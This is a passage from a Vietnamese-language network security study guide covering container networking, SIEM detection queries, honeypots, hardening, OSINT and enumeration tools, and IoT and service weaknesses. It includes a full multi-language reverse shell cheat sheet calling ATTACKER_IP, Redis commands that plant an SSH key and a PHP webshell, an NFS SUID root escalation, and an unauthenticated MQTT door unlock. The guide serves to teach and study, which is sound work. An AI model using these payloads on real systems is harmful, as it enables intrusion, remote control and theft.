```

## 17.3 Container Networking

```
=== Docker Networking ===
Modes:
  bridge (default): Container trên cùng bridge network nói chuyện được
  host: Container dùng host network stack (không isolation)
  none: Không network
  overlay: Multi-host networking (Docker Swarm)
  macvlan: Container có MAC address riêng trên physical network

# Docker network commands
docker network ls
docker network inspect bridge
docker network create --driver bridge my-network
docker run --network my-network nginx

# Security:
# Container mặc định có thể nói chuyện với nhau trên cùng bridge
# → Dùng network segmentation
# --icc=false: Disable inter-container communication
# Docker daemon listens on unix socket by default
# Exposing TCP socket (2375/2376) → RCE nếu không auth!

=== Kubernetes Networking ===
Pod-to-Pod: Tất cả pod nói chuyện được (flat network)
Service: Load balance traffic đến pods
Ingress: L7 routing (HTTP host/path → service)
NetworkPolicy: Firewall rules giữa pods

CNI Plugins: Calico, Cilium, Flannel, Weave

# NetworkPolicy ví dụ: Chỉ cho phép frontend → backend
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend-policy
spec:
  podSelector:
    matchLabels:
      app: backend
  ingress:
  - from:
    - podSelector:
        matchLabels:
          app: frontend
    ports:
    - protocol: TCP
      port: 8080

# Kubernetes security:
# API Server exposed → kubectl access
# etcd unencrypted → secrets leak
# ServiceAccount token mount → lateral movement
# Kubelet API (10250) unauthenticated → RCE
```

## 17.4 Zero Trust Network Architecture (ZTNA)

```
Nguyên tắc: "Never trust, always verify"
Không tin bất kỳ traffic nào, kể cả từ internal network.

Core Principles:
1. Verify explicitly: Authenticate mọi request
2. Least privilege: Tối thiểu quyền cần thiết
3. Assume breach: Thiết kế như đã bị compromise

Components:
  - Identity Provider (IdP): Azure AD, Okta
  - Policy Engine: Quyết định allow/deny dựa trên context
  - Policy Enforcement Point: Enforce quyết định
  - Microsegmentation: Firewall từng workload
  - Continuous monitoring: Liên tục evaluate trust

vs Traditional (Perimeter-based):
  Traditional: Trust internal, distrust external (castle-and-moat)
  Zero Trust: Trust nothing, verify everything

Implementation:
  - BeyondCorp (Google): Pioneer Zero Trust
  - Azure AD Conditional Access
  - Zscaler Private Access
  - Cloudflare Access
```

---

# PHẦN 18: DEFENSE & MONITORING

## 18.1 SIEM (Security Information and Event Management)

```
SIEM = Thu thập log + Correlate events + Alert

Popular SIEMs:
  - Splunk (enterprise, expensive)
  - ELK Stack / Elastic SIEM (open source)
  - Wazuh (open source, HIDS + SIEM)
  - Microsoft Sentinel (cloud, Azure)
  - QRadar (IBM)

=== ELK Stack ===
Elasticsearch: Search engine, lưu trữ log
Logstash: Thu thập, parse, transform log
Kibana: Visualization, dashboard
Beats: Lightweight shipper (Filebeat, Packetbeat, Winlogbeat)

Architecture:
  Sources → Beats/Logstash → Elasticsearch → Kibana
  
# Filebeat config cho syslog
filebeat.inputs:
- type: syslog
  protocol.tcp:
    host: "0.0.0.0:514"
output.elasticsearch:
  hosts: ["localhost:9200"]

=== Splunk ===
# Search query language (SPL)
index=main sourcetype=syslog "failed password"
index=main sourcetype=syslog src_ip=10.10.10.100 | stats count by dest_port
index=main sourcetype=firewall action=blocked | timechart count by src_ip

# Detect brute force
index=main sourcetype=syslog "Failed password"
| stats count by src_ip
| where count > 10

# Detect port scan
index=main sourcetype=firewall
| stats dc(dest_port) as unique_ports by src_ip
| where unique_ports > 50

=== Wazuh ===
# Agent-based: Deploy agent trên mỗi host
# Chức năng: Log analysis, file integrity monitoring,
#            rootkit detection, compliance checking
# Rules: XML-based, tương thích OSSEC
# API: RESTful, integrate với ELK
```

## 18.2 NetFlow / sFlow / IPFIX

```
NetFlow (Cisco): Export flow metadata từ router/switch
sFlow: Sampling-based flow monitoring
IPFIX: Standardized NetFlow v10

Flow record bao gồm:
  Source IP, Dest IP, Source Port, Dest Port,
  Protocol, Bytes, Packets, Timestamps, Interfaces

# Tại sao quan trọng cho security?
# Phát hiện: Data exfiltration (traffic lớn ra ngoài bất thường)
# Phát hiện: Lateral movement (internal traffic patterns thay đổi)
# Phát hiện: C2 beaconing (periodic connections đến external IP)
# Phát hiện: DDoS (traffic spike)

# Tools:
# nfdump/nfsen: NetFlow collector/analyzer
# ntopng: Real-time network traffic analysis
# SiLK: Network flow analysis

# Detect C2 beaconing pattern:
# Tìm connection với interval đều đặn (ví dụ mỗi 60 giây)
# → Periodic pattern + external destination + small data = suspicious
```

## 18.3 Honeypots & Honeynets

```
Honeypot: Hệ thống giả mạo, thu hút attacker để:
  1. Detect intrusion (early warning)
  2. Study attacker TTPs (Tactics, Techniques, Procedures)
  3. Deflect from real assets

Types:
  Low-interaction: Giả lập services (ít risk, dễ deploy)
  High-interaction: Real OS/services (nhiều info, nhiều risk)

# === Cowrie (SSH/Telnet Honeypot) ===
# Giả lập SSH server, log mọi thứ attacker làm
docker run -p 2222:2222 cowrie/cowrie

# Log: Commands, uploads, sessions
# Attacker nghĩ đang SSH vào real server

# === T-Pot (All-in-one) ===
# Bao gồm: Cowrie, Dionaea, Honeytrap, Conpot, v.v.
# Tích hợp ELK cho visualization
# https://github.com/telekom-security/tpotce

# === Dionaea (Malware honeypot) ===
# Giả lập SMB, HTTP, FTP, MSSQL
# Bắt malware samples

# === HoneyD ===
# Giả lập toàn bộ network topology
# Tạo hàng trăm "host" ảo với services

# === Canary Tokens ===
# Không phải honeypot truyền thống
# Tạo file/URL/DNS token → đặt ở nơi chỉ attacker mới access
# Khi access → alert
# https://canarytokens.org
# Ví dụ: Đặt file "passwords.xlsx" (canary) trên share
# → Ai mở = compromise detected
```

## 18.4 Network Hardening (CIS Benchmarks)

```
=== Switch Hardening ===
1. Disable unused ports
2. Port Security (limit MAC per port)
3. DHCP Snooping
4. Dynamic ARP Inspection (DAI)
5. 802.1X on access ports
6. BPDU Guard on access ports
7. Root Guard on distribution ports
8. VLAN access lists (VACL)
9. Private VLANs
10. Disable CDP/LLDP trên edge ports
11. Disable DTP (switchport nonegotiate)
12. Native VLAN ≠ VLAN 1
13. SSH instead of Telnet for management
14. SNMPv3 instead of v1/v2c
15. AAA (RADIUS/TACACS+) for admin login

=== Router Hardening ===
1. Disable unnecessary services (finger, http server, CDP)
2. SSH instead of Telnet
3. ACL on VTY lines (restrict management access)
4. Routing protocol authentication (OSPF MD5, BGP MD5)
5. uRPF (Unicast Reverse Path Forwarding) - anti-spoofing
6. Control plane policing (CoPP)
7. Disable source routing
8. SNMP v3 with authentication + encryption
9. NTP authentication
10. Syslog to external server
```

---

# PHẦN 19: OSINT & RECONNAISSANCE TOOLS

## 19.1 Passive Reconnaissance

### Shodan - Search Engine for IoT/Devices

```bash
# Web: https://shodan.io
# CLI:
pip install shodan
shodan init YOUR_API_KEY

# Tìm device theo service
shodan search "apache" --limit 10
shodan search "port:22 country:VN"
shodan search "webcamxp"
shodan search "default password"

# Tìm target cụ thể
shodan host 8.8.8.8
shodan domain example.com

# Shodan Dorks (web):
# org:"Target Company"
# net:203.0.113.0/24
# port:3389 country:VN
# "Server: Apache" "302" city:"Ho Chi Minh"
# vuln:CVE-2021-44228     (tìm Log4Shell!)
# product:nginx version:1.6
# ssl.cert.subject.cn:target.com
# http.title:"Dashboard" port:8080

# Shodan alternatives:
# Censys: https://censys.io (certificate-focused)
# ZoomEye: https://zoomeye.org (Chinese Shodan)
# FOFA: https://fofa.info
```

### Amass - Subdomain Enumeration

```bash
# Passive enumeration
amass enum -passive -d target.com

# Active enumeration (DNS brute force + resolution)
amass enum -active -d target.com -brute

# Với config (nhiều data sources)
amass enum -d target.com -config amass_config.yaml

# Output
amass enum -d target.com -o subdomains.txt

# Visualization
amass viz -d target.com -o graph.html
```

### Subfinder + httpx combo

```bash
# Tìm subdomain
subfinder -d target.com -o subs.txt

# Check subdomain nào alive
cat subs.txt | httpx -status-code -title -tech-detect -o alive.txt

# Full recon pipeline
subfinder -d target.com -silent | httpx -silent | nuclei -t cves/
```

### Google Dorks

```
site:target.com                         # Chỉ kết quả từ target.com
site:target.com filetype:pdf            # Tìm PDF
site:target.com inurl:admin             # Tìm admin panel
site:target.com intitle:"index of"      # Directory listing
site:target.com ext:sql | ext:db        # Database files
site:target.com intext:"password"       # Password trong page
"target.com" ext:log                    # Log files
"target.com" ext:conf | ext:cfg        # Config files
site:pastebin.com "target.com"          # Leaks trên Pastebin
site:github.com "target.com" password   # Credentials trên GitHub
inurl:"wp-admin" site:target.com        # WordPress admin
```

### Nessus / OpenVAS - Vulnerability Scanners

```bash
# === OpenVAS (Free) ===
# Cài đặt
sudo apt install gvm
sudo gvm-setup
sudo gvm-start
# Truy cập: https://localhost:9392

# OpenVAS CLI
omp -u admin -w password --xml='<create_target>...</create_target>'

# === Nessus (Commercial, free for personal use) ===
# Download từ: https://www.tenable.com/products/nessus
# Truy cập: https://localhost:8834
# Scan types: Basic Network Scan, Advanced Scan, Web Application
# Policies: Customize checks
# Compliance: CIS benchmarks, PCI DSS

# So sánh:
# Nessus: Nhiều plugin hơn, UI tốt hơn, commercial support
# OpenVAS: Free, community-driven, đủ dùng cho lab
```

## 19.2 Web Enumeration Tools

```bash
# === Gobuster (Directory/file brute force) ===
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt
gobuster dns -d target.com -w subdomains.txt
gobuster vhost -u http://target.com -w wordlist.txt

# === ffuf (Fuzz Faster U Fool) ===
# Directory fuzzing
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ

# Parameter fuzzing
ffuf -w params.txt -u "http://target.com/page?FUZZ=value"

# Virtual host fuzzing
ffuf -w vhosts.txt -u http://target.com -H "Host: FUZZ.target.com" \
  -fs 4242    # Filter by response size

# POST data fuzzing
ffuf -w passwords.txt -X POST -d "user=admin&pass=FUZZ" \
  -u http://target.com/login -fc 401

# === Nikto (Web vulnerability scanner) ===
nikto -h http://target.com
nikto -h http://target.com -ssl         # HTTPS
nikto -h http://target.com -Tuning x    # All tests

# === WhatWeb (Technology fingerprinting) ===
whatweb http://target.com
whatweb -a 3 http://target.com          # Aggressive
```

---

# PHẦN 20: REVERSE SHELLS - TOÀN TẬP

## 20.1 Reverse Shell là gì?

```
Normal Shell:
  Attacker ──connect──→ Victim:port (SSH, Telnet)
  → Bị firewall block vì inbound connection

Reverse Shell:
  Victim ──connect──→ Attacker:port
  → Bypass firewall vì outbound connection thường cho phép!

Bind Shell:
  Victim mở port, chờ attacker connect
  → Bị firewall block vì listen port
```

## 20.2 Reverse Shell Cheat Sheet

```bash
# === Attacker: Listener ===
nc -lvnp 4444
# Hoặc dùng rlwrap cho history/arrow keys
rlwrap nc -lvnp 4444

# === Bash ===
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# === Python ===
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# === PHP ===
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# === Perl ===
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# === Ruby ===
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# === PowerShell (Windows) ===
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# === Netcat (nếu có -e)===
nc ATTACKER_IP 4444 -e /bin/bash

# === Netcat without -e ===
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f

# === OpenSSL (Encrypted reverse shell) ===
# Attacker:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
# Victim:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s; rm /tmp/s

# === Socat (Full TTY reverse shell) ===
# Attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444
```

## 20.3 Upgrade Shell to Interactive TTY

```bash
# Bước 1: Spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# hoặc
script -qc /bin/bash /dev/null

# Bước 2: Background shell
Ctrl+Z

# Bước 3: Set terminal
stty raw -echo; fg

# Bước 4: Set environment
export TERM=xterm
export SHELL=bash
stty rows 40 columns 160
```

---

# PHẦN 21: IoT & PROTOCOL SECURITY

## 21.1 MQTT (Message Queuing Telemetry Transport)

```
Port: 1883 (plain), 8883 (TLS)
Dùng cho: IoT devices, smart home, sensors
Model: Publish/Subscribe qua Broker

Components:
  Publisher → Broker (Mosquitto, HiveMQ) → Subscriber
  Topic: hierarchical (home/bedroom/temperature)

# Recon MQTT
nmap -sV -p 1883 target
mosquitto_sub -h target -t '#' -v    # Subscribe ALL topics!
# '#' = wildcard tất cả topics → xem tất cả messages

# Nếu broker KHÔNG có authentication:
# → Đọc tất cả sensor data
# → Publish command giả (mở cửa, tắt đèn, v.v.)
mosquitto_pub -h target -t 'home/door/lock' -m 'UNLOCK'

# Tools:
# mqtt-pwn: MQTT pentest framework
# MQTT Explorer: GUI client
```

## 21.2 CoAP (Constrained Application Protocol)

```
Port: UDP 5683
Dùng cho: Resource-constrained IoT devices
Giống HTTP nhưng nhẹ hơn (UDP instead of TCP)
Methods: GET, POST, PUT, DELETE (giống HTTP)

# Scan CoAP
nmap -sU -p 5683 target
coap-client -m get coap://target/.well-known/core    # Discover resources
```

## 21.3 HTTP/2 và HTTP/3 (QUIC)

```
=== HTTP/2 ===
- Binary protocol (thay vì text của HTTP/1.1)
- Multiplexing: Nhiều request trên 1 TCP connection
- Header compression (HPACK)
- Server push
- Stream prioritization

Security implications:
- HTTP/2 request smuggling (khác HTTP/1.1)
- Desync attacks giữa frontend (HTTP/2) và backend (HTTP/1.1)
- HPACK bomb (decompression bomb qua header compression)

=== HTTP/3 (QUIC) ===
- Dựa trên UDP (thay TCP)
- Built-in TLS 1.3
- 0-RTT connection establishment
- Giảm head-of-line blocking
- Connection migration (đổi IP không mất session)

Security:
- UDP-based → khác biệt firewall rules
- 0-RTT replay attacks
- QUIC traffic khó inspect hơn cho IDS/IPS
```

## 21.4 WebSocket Security

```
WebSocket: Full-duplex communication qua 1 TCP connection
Upgrade: HTTP → WebSocket

# Handshake
GET /chat HTTP/1.1
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==

# Response
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade

# Security issues:
# Cross-Site WebSocket Hijacking (CSWSH)
# No same-origin enforcement (phải check Origin header manually)
# Injection trong messages
# Missing authentication after upgrade

# Testing với wscat
npm install -g wscat
wscat -c ws://target.com/ws

# Burp Suite: Proxy → WebSocket History
```

## 21.5 gRPC Security

```
gRPC: High-performance RPC framework (Google)
Protocol: HTTP/2 + Protocol Buffers
Port: Thường 50051

# gRPC reflection (tương tự WSDL discovery)
grpcurl -plaintext target:50051 list        # List services
grpcurl -plaintext target:50051 describe    # Describe methods
grpcurl -plaintext -d '{"name":"test"}' target:50051 package.Service/Method

# Security:
# Nếu reflection enabled → enum toàn bộ API
# Plaintext gRPC (không TLS) → sniffing
# Missing authentication/authorization
# Proto definition leak → understand internal API
```

---

# PHẦN 22: NTP, NFS & OTHER SERVICES

## 22.1 NTP (Network Time Protocol) - Port 123

```bash
# NTP quan trọng vì:
# Kerberos dựa vào time sync (max 5 min skew)
# Log correlation cần time sync
# Certificate validation dựa vào time

# NTP Enumeration
ntpq -p target                    # List NTP peers
nmap --script ntp-info -p 123 target
nmap --script ntp-monlist -p 123 target   # monlist (amplification vector)

# NTP Attacks:
# 1. NTP Amplification DDoS (monlist)
# 2. Time manipulation → break Kerberos, bypass cert expiry
# 3. NTP mode 6 (control) queries → info disclosure

# Phòng chống:
# Disable monlist: restrict noquery
# Use NTP authentication
# Pool: pool.ntp.org instead of single server
```

## 22.2 NFS (Network File System) - Port 2049

```bash
# NFS Enumeration
showmount -e 192.168.1.100              # List exported shares
nmap --script nfs-showmount 192.168.1.100

# Mount NFS share
mkdir /mnt/nfs
mount -t nfs 192.168.1.100:/share /mnt/nfs
mount -t nfs -o vers=3 192.168.1.100:/share /mnt/nfs

# Common misconfig: no_root_squash
# → root trên client = root trên NFS server
# Exploit: Mount share, tạo SUID binary, execute trên server

# Tạo SUID bash (nếu no_root_squash):
cp /bin/bash /mnt/nfs/rootbash
chmod +s /mnt/nfs/rootbash
# Trên server: ./rootbash -p → root shell!
```

## 22.3 Redis - Port 6379

```bash
# Redis mặc định KHÔNG CÓ authentication!
redis-cli -h 192.168.1.100

# Enum
INFO
CONFIG GET *
KEYS *
GET key_name

# Write SSH key (RCE nếu Redis chạy root)
redis-cli -h target
> CONFIG SET dir /root/.ssh/
> CONFIG SET dbfilename authorized_keys
> SET payload "\n\nssh-rsa AAAA... attacker@kali\n\n"
> SAVE

# Write webshell
> CONFIG SET dir /var/www/html/
> CONFIG SET dbfilename shell.php
> SET payload "<?php system($_GET['cmd']); ?>"
> SAVE
# Truy cập: http://target/shell.php?cmd=id
```

## 22.4 MongoDB - Port 27017

```bash
# MongoDB mặc định KHÔNG CÓ authentication!
mongo --host 192.168.1.100

# Enum
> show dbs
> use admin
> show collections
> db.users.find()
> db.users.find().pretty()

# Dump toàn bộ
mongodump --host 192.168.1.100 --out /tmp/dump

# Nmap script
nmap --script mongodb-info,mongodb-databases -p 27017 target
```

---

# PHẦN 23: eBPF & MODERN NETWORK SECURITY

## 23.1 eBPF (extended Berkeley Packet Filter)

```
eBPF là gì?
Chạy sandboxed programs trong Linux kernel KHÔNG cần modify kernel.
Dùng cho: Network monitoring, security enforcement, observability.

Use cases Security:
  - Packet filtering hiệu suất cao (thay iptables)
  - System call monitoring (detect malicious behavior)
  - Container network policy (Cilium)
  - Runtime security (Falco, Tetragon)

# === Cilium (Kubernetes CNI + Security) ===
# Network policy enforcement bằng eBPF
# Thay vì iptables rules → eBPF programs
# L3/L4 + L7 policy (HTTP, gRPC, Kafka)
# Transparent encryption (WireGuard)

# === Falco (Runtime Security) ===
# Detect suspicious behavior dựa trên syscall monitoring
# Rules ví dụ:
# - Phát hiện shell spawn trong container
# - Phát hiện sensitive file read (/etc/shadow)
# - Phát hiện outbound connection bất thường

# === Tetragon (Cilium) ===
# eBPF-based security observability
# Enforce policies tại kernel level
# Detect + prevent file/network/process events

# === bpftrace (Tracing tool) ===
# Trace network events
bpftrace -e 'tracepoint:net:netif_rx { printf("%s\n", comm); }'
bpftrace -e 'kprobe:tcp_connect { printf("TCP connect: %s\n", comm); }'
```

---

# PHẦN 24: NETWORK SECURITY FRAMEWORKS & COMPLIANCE

## 24.1 NIST Cybersecurity Framework

```
5 Core Functions:
  1. Identify   → Asset management, risk assessment
  2. Protect    → Access control, awareness, data security
  3. Detect     → Anomalies, continuous monitoring, detection processes
  4. Respond    → Response planning, communications, analysis
  5. Recover    → Recovery planning, improvements

Network Security Controls (NIST 800-53):
  AC (Access Control)
  AU (Audit and Accountability)
  CA (Security Assessment)
  SC (System and Communications Protection)
  SI (System and Information Integrity)
```

## 24.2 MITRE ATT&CK - Network Techniques

```
Reconnaissance:
  T1595 - Active Scanning
  T1590 - Gather Victim Network Information
  T1596 - Search Open Technical Databases

Initial Access:
  T1133 - External Remote Services
  T1190 - Exploit Public-Facing Application

Lateral Movement:
  T1021 - Remote Services (SSH, RDP, SMB, WinRM)
  T1080 - Taint Shared Content
  T1563 - Remote Service Session Hijacking

Command and Control:
  T1071 - Application Layer Protocol (HTTP, DNS, SMTP)
  T1572 - Protocol Tunneling
  T1573 - Encrypted Channel
  T1090 - Proxy
  T1095 - Non-Application Layer Protocol (ICMP)

Exfiltration:
  T1048 - Exfiltration Over Alternative Protocol
  T1041 - Exfiltration Over C2 Channel
  T1567 - Exfiltration Over Web Service

# Dùng ATT&CK để:
# 1. Map coverage: Kiểm tra detection rules cover technique nào
# 2. Gap analysis: Technique nào chưa có detection
# 3. Threat modeling: Threat actor dùng technique nào
# 4. Purple team: Red team tấn công theo ATT&CK, blue team detect
```

---

# TỔNG KẾT CUỐI CÙNG

## Network Learning Path (Thứ tự học)

```
Level 1 - Foundations (Tuần 1-4):
  □ OSI Model + TCP/IP Model
  □ IP addressing + Subnetting
  □ TCP/UDP + Handshakes
  □ DNS, DHCP, ARP
  □ Basic tools: ping, traceroute, netstat, nmap
  □ Lab: Dựng VirtualBox + Kali + Metasploitable

Level 2 - Intermediate (Tuần 5-8):
  □ Wireshark + tcpdump deep dive
  □ HTTP/HTTPS + TLS
  □ Routing & Switching (VLAN, STP, OSPF)
  □ Firewall (iptables/nftables)
  □ Nmap advanced (NSE scripts)
  □ Lab: TryHackMe Network rooms

Level 3 - Offensive (Tuần 9-14):
  □ MITM attacks (ARP, DNS, SSL strip)
  □ Password attacks (Hydra, CrackMapExec)
  □ Responder + NTLM relay
  □ Network scanning methodology
  □ Burp Suite / Charles Proxy
  □ Lab: HackTheBox Easy machines

Level 4 - Red Team (Tuần 15-20):
  □ Pivoting (SSH, Chisel, Ligolo-ng)
  □ Tunneling (DNS, ICMP, HTTP)
  □ Lateral Movement (PtH, PtT, WinRM)
  □ Kerberos attacks
  □ C2 Frameworks (Sliver)
  □ Lab: HackTheBox Pro Labs (Dante, Offshore)

Level 5 - Expert (Tuần 21+):
  □ Cloud networking (AWS/Azure)
  □ Container/K8s networking
  □ Zero Trust architecture
  □ BGP/OSPF attacks
  □ Advanced evasion
  □ DDoS mitigation
  □ SIEM + threat detection
  □ eBPF security
  □ Cert: OSCP → CRTO → OSEP
```

> **Lời khuyên cuối**: Networking là nền tảng của mọi thứ trong security. Đừng vội nhảy vào tools mà chưa hiểu fundamentals. Khi bạn hiểu packet đi từ đâu đến đâu, qua những gì, bạn sẽ tự biết cách exploit và defend. Hãy dựng lab và thực hành. Đọc xong phần nào → làm lab phần đó. Không có shortcut.
